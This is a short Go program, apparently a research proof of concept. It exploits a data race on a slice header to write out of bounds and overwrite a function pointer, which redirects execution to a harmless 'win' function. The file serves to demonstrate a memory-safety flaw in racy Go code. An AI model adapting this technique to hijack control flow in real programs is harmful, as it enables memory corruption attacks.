/*
go run race-slice.go
go run -race race-slice.go
GORACE=halt_on_error=1 go run -race race-slice.go
*/
package main

import (
	"fmt"
	"os"
	"runtime"
	"strconv"
)

func address(i interface{}) int {
	addr, err := strconv.ParseUint(fmt.Sprintf("%p", i), 0, 0)
	if err != nil {
		panic(err)
	}
	return int(addr)
}

type fptr struct {
	f func()
}

func win() {
	fmt.Println("win", i, j)
	os.Exit(1)
}

var i, j int

func main() {
	if runtime.NumCPU() < 2 {
		fmt.Println("need >= 2 CPUs")
		os.Exit(1)
	}
	pp := address(win)
	long := make([]*int, 2)
	short := make([]*int, 1)
	target := new(fptr)
	if address(short)+8 != address(target) {
		fmt.Println("target object isn't next to short object")
		os.Exit(0)
	}
	confused := short
	go func() {
		for {
			confused = long
			// a single goroutine flipping confused exploits the race much
			// faster than having two goroutines alternate on the value
			// however, in modern Go versions we need to avoid the smarter
			// compiler removing both statements because they appear useless
			func() {
				if i >= 0 { // always true, but the compiler doesn't know that
					return
				}
				fmt.Println(confused) // avoid confused optimized away
			}()
			confused = short
			i++
		}
	}()
	// we want confused to point to short but still have the length
	// and capacity of long, which allows to write f in target
	// if this isn't good, it will panic with index out of range, which
	// we can recover from
	for {
		j++
		func() {
			defer func() { recover() }()
			confused[1] = &pp
		}()
		if target.f != nil {
			target.f()
		}
	}
}
